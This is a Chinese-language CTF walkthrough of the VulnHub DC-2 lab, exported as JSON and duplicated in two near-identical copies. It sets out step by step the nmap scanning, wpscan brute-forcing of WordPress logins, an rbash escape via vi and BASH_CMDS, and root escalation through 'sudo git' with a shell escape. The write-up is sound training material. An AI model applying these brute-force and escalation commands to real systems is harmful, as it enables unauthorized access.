[{"content":"前言 与 DC-1 非常相似，DC-2 是另一个专门建造的易受攻击实验室，目的是获得渗透测试领域的经验。 与最初的 DC-1 一样，它的设计考虑到了初学者。 必须具备 Linux 技能和熟悉 Linux 命令行，以及具备一些基本渗透测试工具的经验。 就像 DC-1 一样，有五个标志，包括最后一个标志。 再说一次，就像 DC-1 一样，这些标志对初学者很重要，但对有经验的人来说并不那么重要。 简而言之，唯一真正重要的标志是最后一面旗帜。 对于初学者来说，Google 是您的朋友。嗯，除了所有的隐私问题等。 我还没有探索实现 root 的所有方法，因为我放弃了我一直在努力的上一个版本，除了基本操作系统安装之外，我完全从头开始。\n[TOC]\n实验环境： 下载链接： https://www.vulnhub.com/entry/dc-1,292/\n（下载慢，放到迅雷里面）\nVMware环境配置 必须是NAT模式，且攻击机也是NAT模式\n攻击步骤 一、信息收集 查看自己的IP地址，使用nmap进行同网段扫描\n1 2 3 ifconfig ip:192.168.26.128 nmap -sP 192.168.26.128/24 目标IP：192.168.26.129\n扫描该IP端口及服务\n1 nmap -p- -sV 192.168.26.129 结果\n1 2 3 4 5 6 7 8 9 10 11 12 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 23:26 EDT Nmap scan report for 192.168.26.129 Host is up (0.00062s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.10 ((Debian)) 7744/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0) MAC Address: 00:0C:29:F4:BE:15 (VMware) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 7.27 seconds 一个http的80端口，一个7744的ssh服务\n如果访问打不开网站的话，说明网站被重定向了\n添加一下主机就行了\n1 2 vim /etc/hosts 192.168.26.129 dc-2 flag1 打开页面发现flag标志\n意思：\n让我们找会员的登录密码，登录一个人后给下一个flag\n二、渗透阶段 flag2 cewl介绍:\n是一个用于生成自定义字典文件的工具，通常用于渗透测试和密码破解。它通过爬取目标网站，提取其中的单词、短语和其他文本信息，以便生成一个用于攻击的字典文件。\n扒一下网站，看看有什么\n1 cewl http://dc-2 -w passwd.txt 再扫描一下目录\n1 dirb http://dc-2 扫描到登录界面\n有密码了，现在只要枚举一下用户名\n1 wpscan --url http://dc-2/ -e u //枚举用户名字 枚举出来的用户名\n1 2 3 admin tom jerry 然后创建一个user.txt文件\n1 touch user.txt 1 2 3 echo \u0026#34;admin\u0026#34; \u0026gt;\u0026gt; user.txt echo \u0026#34;tom\u0026#34; \u0026gt;\u0026gt; user.txt echo \u0026#34;jerry\u0026#34; \u0026gt;\u0026gt; user.txt 爆破登录框\n1 wpscan --url http://dc-2/ -U user.txt -P passwd.txt 拿到用户和密码进行登录\n1 2 3 [!] Valid Combinations Found: Username: jerry, Password: adipiscing Username: tom, Password: parturient 到处点一点拿到flag2\n意思：\n如果你不能利用WordPress并走捷径，还有另一种方法。\n希望你找到了另一个切入点。\nflag3 前面有一个7744端口的ssh远程连接服务\n1 ssh tom@192.168.26.129 -p 7744 进行连接登录\nls-l查看文件目录，有一个flag3.txt\ncat 查看该文件发现权限不足\n查看可用的命令\n1 2 3 4 5 6 compgen -c //查看可以使用的指令 less scp ls vi 发现有个vi,用这个命令打开该文件\n1 vi flag3.txt 拿到flag3\n1 poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes. 意思：\n可怜的老汤姆总是追着杰瑞跑。也许他应该为他造成的所有压力感到自豪。\nflag4 提示：大概意思就是提权\n打开一个文件，用vi去编辑，然后提权\n1 2 3 vi flag3.txt :set shell=/bin/sh :shell 执行\n1 2 3 su cd .. ls -l 该目录下有 tom和jerry\n到jerry用户下面\n1 2 cd jerry vi flag4.txt flag4.txt\nood to see that you\u0026rsquo;ve made it this far - but you\u0026rsquo;re not home yet. You still need to get the final flag (the only flag that really counts!!!). No hints here - you\u0026rsquo;re on your own now. :-) Go on - git outta here!!!!\nflag5 切换到jerry用户下面\n1 2 3 4 5 6 7 exit BASH_CMDS[su]=/bin/sh su xport PATH=$PATH:/bin/ export PATH=$PATH:/usr/bin/ su jerry 输入jerry的密码，前面收集爆破到的密码 三、提权 使用git提权即可\n1 2 3 sudo git help config #这边直接输下面的命令，不用打： !/bin/sh 1 2 3 su cd /root cat final-flag.txt flag5\nCongratulatons!!! A special thanks to all those who sent me tweets and provided me with feedback - it\u0026rsquo;s all greatly appreciated. If you enjoyed this CTF, send me a tweet via @DCAU7.\n总结： 希望对大家有帮助\n","date":"2024-10-31T00:00:00Z","image":"https://dxlaboratory.github.io/20241104083955.jpg","permalink":"https://dxlaboratory.github.io/p/test-chinese/","title":"DC-2"},{"content":"title: dc-2 description: 这是一个副标题 date: 2020-09-09 slug: test-chinese categories: - 靶机\n前言 与 DC-1 非常相似，DC-2 是另一个专门建造的易受攻击实验室，目的是获得渗透测试领域的经验。 与最初的 DC-1 一样，它的设计考虑到了初学者。 必须具备 Linux 技能和熟悉 Linux 命令行，以及具备一些基本渗透测试工具的经验。 就像 DC-1 一样，有五个标志，包括最后一个标志。 再说一次，就像 DC-1 一样，这些标志对初学者很重要，但对有经验的人来说并不那么重要。 简而言之，唯一真正重要的标志是最后一面旗帜。 对于初学者来说，Google 是您的朋友。嗯，除了所有的隐私问题等。 我还没有探索实现 root 的所有方法，因为我放弃了我一直在努力的上一个版本，除了基本操作系统安装之外，我完全从头开始。\n[TOC]\n实验环境： 下载链接： https://www.vulnhub.com/entry/dc-1,292/\n（下载慢，放到迅雷里面）\nVMware环境配置 必须是NAT模式，且攻击机也是NAT模式\n![20241104083955](20241104083955.jpg\n攻击步骤 一、信息收集 查看自己的IP地址，使用nmap进行同网段扫描\n1 2 3 ifconfig ip:192.168.26.128 nmap -sP 192.168.26.128/24 目标IP：192.168.26.129\n扫描该IP端口及服务\n1 nmap -p- -sV 192.168.26.129 结果\n1 2 3 4 5 6 7 8 9 10 11 12 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 23:26 EDT Nmap scan report for 192.168.26.129 Host is up (0.00062s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.10 ((Debian)) 7744/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0) MAC Address: 00:0C:29:F4:BE:15 (VMware) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 7.27 seconds 一个http的80端口，一个7744的ssh服务\n如果访问打不开网站的话，说明网站被重定向了\n添加一下主机就行了\n1 2 vim /etc/hosts 192.168.26.129 dc-2 flag1 打开页面发现flag标志\n意思：\n让我们找会员的登录密码，登录一个人后给下一个flag\n二、渗透阶段 flag2 cewl介绍:\n是一个用于生成自定义字典文件的工具，通常用于渗透测试和密码破解。它通过爬取目标网站，提取其中的单词、短语和其他文本信息，以便生成一个用于攻击的字典文件。\n扒一下网站，看看有什么\n1 cewl http://dc-2 -w passwd.txt 再扫描一下目录\n1 dirb http://dc-2 扫描到登录界面\n有密码了，现在只要枚举一下用户名\n1 wpscan --url http://dc-2/ -e u //枚举用户名字 枚举出来的用户名\n1 2 3 admin tom jerry 然后创建一个user.txt文件\n1 touch user.txt 1 2 3 echo \u0026#34;admin\u0026#34; \u0026gt;\u0026gt; user.txt echo \u0026#34;tom\u0026#34; \u0026gt;\u0026gt; user.txt echo \u0026#34;jerry\u0026#34; \u0026gt;\u0026gt; user.txt 爆破登录框\n1 wpscan --url http://dc-2/ -U user.txt -P passwd.txt 拿到用户和密码进行登录\n1 2 3 [!] Valid Combinations Found: Username: jerry, Password: adipiscing Username: tom, Password: parturient 到处点一点拿到flag2\n意思：\n如果你不能利用WordPress并走捷径，还有另一种方法。\n希望你找到了另一个切入点。\nflag3 前面有一个7744端口的ssh远程连接服务\n1 ssh tom@192.168.26.129 -p 7744 进行连接登录\nls-l查看文件目录，有一个flag3.txt\ncat 查看该文件发现权限不足\n查看可用的命令\n1 2 3 4 5 6 compgen -c //查看可以使用的指令 less scp ls vi 发现有个vi,用这个命令打开该文件\n1 vi flag3.txt 拿到flag3\n1 poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes. 意思：\n可怜的老汤姆总是追着杰瑞跑。也许他应该为他造成的所有压力感到自豪。\nflag4 提示：大概意思就是提权\n打开一个文件，用vi去编辑，然后提权\n1 2 3 vi flag3.txt :set shell=/bin/sh :shell 执行\n1 2 3 su cd .. ls -l 该目录下有 tom和jerry\n到jerry用户下面\n1 2 cd jerry vi flag4.txt flag4.txt\nood to see that you\u0026rsquo;ve made it this far - but you\u0026rsquo;re not home yet. You still need to get the final flag (the only flag that really counts!!!). No hints here - you\u0026rsquo;re on your own now. :-) Go on - git outta here!!!!\nflag5 切换到jerry用户下面\n1 2 3 4 5 6 7 exit BASH_CMDS[su]=/bin/sh su xport PATH=$PATH:/bin/ export PATH=$PATH:/usr/bin/ su jerry 输入jerry的密码，前面收集爆破到的密码 三、提权 使用git提权即可\n1 2 3 sudo git help config #这边直接输下面的命令，不用打： !/bin/sh 1 2 3 su cd /root cat final-flag.txt flag5\nCongratulatons!!! A special thanks to all those who sent me tweets and provided me with feedback - it\u0026rsquo;s all greatly appreciated. If you enjoyed this CTF, send me a tweet via @DCAU7.\n总结： 希望对大家有帮助\n","date":"0001-01-01T00:00:00Z","permalink":"https://dxlaboratory.github.io/p/","title":""}]